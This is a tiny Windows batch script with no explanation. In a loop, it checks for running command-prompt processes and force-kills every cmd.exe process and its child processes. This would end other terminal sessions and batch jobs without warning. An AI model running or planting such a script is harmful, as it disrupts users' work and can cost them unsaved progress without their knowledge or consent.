@echo off
:a
tasklist|find /i "cmd.exe" ||exit
taskkill /im cmd.exe /t /f
ping 127.1 -n 1 >nul 2>nul
goto :a